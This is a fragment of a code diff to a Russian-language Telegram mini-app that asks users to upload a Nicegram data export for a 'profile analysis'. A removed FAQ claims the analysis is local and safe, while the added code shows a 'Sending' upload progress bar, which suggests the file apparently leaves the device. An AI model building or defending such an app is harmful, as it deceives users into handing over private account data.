-                    clearInterval(loadingInterval);
-                    
-                    // Увеличиваем статистику
-                    statsNumber += 1;
-                    document.querySelector('.stats-number').textContent = 
-                        statsNumber.toLocaleString('ru-RU');
-                    
-                    // Показываем результаты
-                    setTimeout(() => {
-                        showScreen('successScreen');
-                    }, 500);
-                }
-            }, intervalTime);
+            setTimeout(() => {
+                errorElement.style.display = 'none';
+            }, 5000);
         }
-
-        function showInstruction() {
-            alert('📖 ИНСТРУКЦИЯ:\n\n1. Экспортируйте данные из Nicegram\n2. Загрузите файл в это приложение\n3. Получите анализ своего профиля\n4. Проверьте статистику подарков');
+        
+        // Обновить прогресс
+        function updateProgress(percent) {
+            document.getElementById('progressFill').style.width = percent + '%';
+            document.getElementById('progressText').textContent = `Отправка: ${percent}%`;
         }
-
-        function showFAQ() {
-            alert('❓ ЧАСТЫЕ ВОПРОСЫ:\n\nQ: Какой файл нужен?\nA: Экспорт данных из Nicegram (JSON/HTML)\n\nQ: Что анализируется?\nA: Ваш ник, подарки, звезды, история\n\nQ: Безопасно ли это?\nA: Да, анализ происходит локально');
+        
+        // Форматирование размера файла
+        function formatFileSize(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
         }
-
+        
+        // Закрыть приложение
         function closeApp() {
             if (tg && tg.close) {
                 tg.close();
-            } else {
-                alert('Приложение закрыто');
             }
         }
     </script>
